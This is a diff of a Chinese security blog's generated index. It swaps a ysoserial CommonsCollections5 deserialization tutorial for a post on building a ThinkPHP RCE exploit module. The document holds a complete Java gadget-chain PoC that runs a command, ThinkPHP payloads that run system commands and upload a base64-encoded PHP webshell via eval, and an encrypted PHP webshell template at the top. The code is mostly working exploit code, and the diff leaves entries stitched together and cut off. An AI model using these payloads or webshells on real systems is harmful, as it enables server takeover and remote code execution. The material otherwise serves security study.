class="line">         <span class="string">&quot;\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\telse\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=openssl_decrypt($post, \&quot;AES128\&quot;, $key);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $arr=explode(&#x27;|&#x27;,$post);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $func=$arr[0];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $params=$arr[1];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tclass C&#123;public function __invoke($p) &#123;eval($p.\&quot;\&quot;);&#125;&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    @call_user_func(new C(),$params);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;?&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p>这里重点看**BadAttributeValueExpException.readObject()<strong>和</strong>TiedMapEntry.toString()**，其他的都和前面两章一样 <a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections1(二)</a>、<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484560&idx=1&sn=8a997456a5ccc09a4c11208e92c31093&chksm=c2829d89f5f5149f8000c1070e28eaf3049847b41e1377bf68f1074f7163ee7071eb61c84695&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections6(三)</a></p>
-<h3 id="1-1-TiedMapEntry-toString"><a href="#1-1-TiedMapEntry-toString" class="headerlink" title="1.1 TiedMapEntry.toString()"></a>1.1 TiedMapEntry.toString()</h3><p>上一节说过解决<strong>Java高版本利用</strong>问题，实际上就是在找是否还有其他调用 <strong>LazyMap#get()</strong> 的地方，因为<strong>LazyMap</strong>对象是只要执行<strong>get</strong>方法就会调用<strong>transform</strong>，而<strong>transform</strong>的特性是可以执行任意方法。</p>
-<p>CC6中是在<strong>TiedMapEntry</strong>类中找到了<strong>hashCode</strong>方法中调用了<strong>map.get(key);</strong>,并且<strong>map</strong>是我们可控的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204945.png" alt="image-20210630213657788"></p>
-<p>而CC5中则是利用了<strong>TiedMapEntry#toString</strong>方法<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204954.png" alt="image-20210630212357694"></p>
-<p>还是先实验一下，确定可以<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205000.png" alt="image-20210630214320487"></p>
-<p>但这还不够好，我们希望的是目标反序列化后直接触发命令的执行，因此我们需要找到一个类在反序列化后会直接触发 <strong>TiedMapEntry#toString</strong> 从而触发命令的执行。</p>
-<h3 id="1-2-BadAttributeValueExpException-readObject"><a href="#1-2-BadAttributeValueExpException-readObject" class="headerlink" title="1.2 BadAttributeValueExpException.readObject()"></a>1.2 BadAttributeValueExpException.readObject()</h3><p>在ysoserial中是利用了 <strong>rt.jar!&#x2F;javax&#x2F;management&#x2F;BadAttributeValueExpException.class#readObject</strong>方法来达到上述目的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205412.png" alt="image-20210630214951419"></p>
-<blockquote>
-<p>这里我们可以看到<strong>BadAttributeValueExpException</strong>并没有实现<strong>Serializable</strong>接口,为什么可以序列化？<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205417.png" alt="image-20210701200642699"></p>
-<p>其实是<strong>BadAttributeValueExpException</strong>继承了<strong>Exception</strong>，<strong>Exception</strong>又继承了<strong>Throwable</strong>，<strong>Throwable</strong>实现了<strong>Serializable</strong>接口<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205421.png" alt="image-20210701200756489"></p>
-</blockquote>
-<p>在<strong>BadAttributeValueExpException#readObject</strong>中发现<strong>get</strong>函数获取<strong>val</strong>的值然后赋给<strong>valObj</strong>，然后在符合<strong>第二个else if</strong>的情况下就会调用<strong>toString</strong>, 巧的是 <strong>System.getSecurityManager()</strong> 返回值默认为<strong>null</strong><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205426.png" alt="image-20210701201112074"></p>
-<p>这样就只需要可以控制<strong>val</strong>的值就可以执行命令了。</p>
-<p>然后我们发现在构造函数中就可以控制<strong>val</strong>的值，可以直接将<strong>tiedMapEntry</strong>作为参数传进去。</p>
-<p><strong>注意</strong>:在构造函数中我们可以看到，当传入一个<strong>val</strong>，<strong>val</strong>就不等于<strong>null</strong>，会调用一次<strong>toString()<strong>方法,也就是说，创建</strong>BadAttributeValueExpException</strong>对象时会弹出一次计算器，而在我们的构想中，反序列化时也会弹出一次，总共是<strong>两</strong>次。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205431.png" alt="image-20210630220727451"></p>
-<p>实验一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205435.png" alt="image-20210630221313347"></p>
-<p>但是，最终发现只弹了一次计算器，也就是说在反序列化时并没有执行<strong>toString</strong>方法，进而执行命令。</p>
-<p>直接在<strong>BadAttributeValueExpException#readObject</strong>下断点Debug一下,会发现这时<strong>valObj</strong>是一个字符串了，直接进入了<strong>第一个 else if <strong>判断中，并没有进入</strong>第二个 else if <strong>，这是因为在创建</strong>BadAttributeValueExpException</strong>对象时，<strong>val</strong>已经执行过了一次<strong>toString</strong>方法，变成了字符串，所以匹配到了**第一个 else if **判断<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205443.png" alt="image-20210630221828997"></p>
-<p>要想改变<strong>val</strong>的值就需要用到前面反复提到的<strong>反射</strong>了</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(bad, tiedMapEntry);</span><br></pre></td></tr></table></figure>
+<p>238行也修改 test.jsp 改为 test.php</p>
+<p>修改<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011758.png" alt="image-20210819011243601"></p>
+<p>这个文件修改完毕，不用动了，以后再添加thinkphp相关漏洞，只需要改<strong>BASICINFO</strong>中的描述信息(不加也可,翻遍看)，<strong>ThinkPHP</strong> 还是要改的，这个是选择漏洞列表中的东西，往后添加就行。</p>
+<p>下面去 <strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;tools&#x2F;Tools.java</strong>文件， 找到184行的<strong>getExploit</strong>方法。</p>
+<p>添加一个判断就行，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011804.png" alt="image-20210818215324824"></p>
+<p>这就完了，看着图多，其实就几步，主要是为了详细</p>
+<h2 id="0x02-写EXP的具体实现"><a href="#0x02-写EXP的具体实现" class="headerlink" title="0x02 写EXP的具体实现"></a>0x02 写EXP的具体实现</h2><h3 id="2-1-checkVul-首先检测漏洞是否存在"><a href="#2-1-checkVul-首先检测漏洞是否存在" class="headerlink" title="2.1 checkVul - 首先检测漏洞是否存在"></a>2.1 checkVul - 首先检测漏洞是否存在</h3><p>Vulhub 也给了payload，方便省事，使用poc打一下,原poc是输出phpinfo,这里改成了输出一串字符<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011812.png" alt="image-20210818213036338"></p>
+<p>转成java,都是最基础的写法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测漏洞是否存在</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(md5(123))&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交</span></span><br><span class="line">            <span class="comment">// 注意 这要用 try  catch 捕获一下异常</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + check_payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 看回显，是否存在 202cb962ac59075b964b07152d234b70</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> result.contains(<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isVul = <span class="literal">true</span>;  <span class="comment">// 存在漏洞</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 输出错误日志</span></span><br><span class="line">            logger.error(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205451.png" alt="image-20210701204112054"></p>
-<p>完整代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/30 21:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(bad, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>写完测试一下</p>
+<p>运行<strong>AppStartUp.java</strong>，测试一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011828.png" alt="image-20210818224529463"></p>
+<p>成功，而且可以设置代理，走bp，看具体流量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011837.png" alt="image-20210818224612182"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011844.png" alt="image-20210818224629863"></p>
+<h3 id="2-2-getWebPath-获取网站根目录"><a href="#2-2-getWebPath-获取网站根目录" class="headerlink" title="2.2 getWebPath 获取网站根目录"></a>2.2 getWebPath 获取网站根目录</h3><p>这个写不写都行，这里写一下吧,thinkphp 可以通过<code>realpath(__ROOT__)</code>来获取网站的根路径，改下payload就好</p>
+<p><code>/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的web路径，有最好，没有也无所谓</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getWebPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个payload会把 html网页也给输出，这里分割简单去除一下</span></span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;命令执行失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011857.png" alt="image-20210818230017745"></p>
+<h3 id="2-3-exeCmd-执行命令"><a href="#2-3-exeCmd-执行命令" class="headerlink" title="2.3 exeCmd  执行命令"></a>2.3 exeCmd  执行命令</h3><p>这里先将 <strong>isVul</strong>方法改一下，命令执行依赖于检测，只有检测存在，才能进行命令执行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVul</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isVul;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>Payload <code>/index.php?s=/index/index/name/$&#123;@print(system(whoami))&#125;</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令执行</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(system(payload))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 替换payload 中的 payload 字符为要执行的命令</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>天下大木头师傅的 <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
+<p>测试通过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011905.png" alt="image-20210818230642660"></p>
+<h3 id="2-4-uploadFile-上传shell"><a href="#2-4-uploadFile-上传shell" class="headerlink" title="2.4 uploadFile 上传shell"></a>2.4 uploadFile 上传shell</h3><p>Payload <code>http://127.0.0.1:8080/index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;</code> 这是网上的payload，上传后使用蚁剑连接即可</p>
+<p>虽然，直接使用这个payload也可用，但不方便我们自定义上传的shell马</p>
+<p>@bewhale 师傅的 thinkphp利用工具 <a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a> 中使用这个payload来上传文件</p>
+<p><code>/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#39;bak.php&#39;,base64_decode(&#39;PD9waHAgJGE9In4rZCgpIl4iIXsre30iO0AkYj1iYXNlNjRfZGVjb2RlKCR7JGF9WyJhIl0pO2V2YWwoIiIuJGIpOz8%2B&#39;)); </code></p>
+<p>拿来直接用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(String fileContent, String filename, String platform)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 对文件 base64 编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Data</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileContent.getBytes());</span><br><span class="line">        <span class="comment">// 注意一下，需要对 base64 编码后的在进行一次url编码，</span></span><br><span class="line">        base64Data = URLEncoder.encode(base64Data, <span class="string">&quot;UTF-8&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#x27;&quot;</span> + filename + <span class="string">&quot;&#x27;,base64_decode(&#x27;&quot;</span> + base64Data + <span class="string">&quot;&#x27;));&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> HttpTool.getStatus(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line">        System.out.println(status);</span><br><span class="line">        <span class="keyword">if</span>(status == <span class="number">200</span>) &#123;</span><br><span class="line">            result = <span class="string">&quot;上传成功! 路径： &quot;</span> + <span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result =  <span class="string">&quot;上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011913.png" alt="image-20210819011430581"></p>
+<p>打完收工</p>
 ]]></content>
       <categories>
-        <category>漏洞原理</category>
+        <category>GitHub工具</category>
       </categories>
       <tags>
-        <tag>漏洞原理</tag>
+        <tag>GitHub工具</tag>
       </tags>
   </entry>
   <entry>
@@ -444,6 +386,64 @@
 <p>上述分析过程用到的代码都已上传到 <a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
 <h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.gettoby.com/p/0h2v47vgjznb">https://www.gettoby.com/p/0h2v47vgjznb</a></p>
 <p>P牛知识星球-java安全漫谈</p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java ysoserial学习之CommonsCollections5(四)</title>
+    <url>/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/</url>
+    <content><![CDATA[<blockquote>
+<p>  庆祝我伟大的党百年华诞🎉</p>
+<p>  向伟大的祖国敬礼(‘-‘*ゞ</p>
+</blockquote>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上节说道在<strong>commons-collections-3.2.1.jar!&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;keyvalue&#x2F;TiedMapEntry.class</strong>类中，总共有三个函数调用了<strong>getValue</strong>函数：</p>
+<ul>
+<li><p><strong>toString</strong>    CC5   本文重点</p>
+</li>
+<li><p><strong>hashCode</strong>    CC6</p>
+</li>
+<li><p><strong>equals</strong>      CC7</p>
+</li>
+</ul>
+<p>本文CommonsCollections6利用链的限制条件：</p>
+<p>​	JDK版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p>
+<p>实验环境:</p>
+<p>​	JDK 1.8.0_261 、Commons-Collections 3.2.1 </p>
+<h2 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                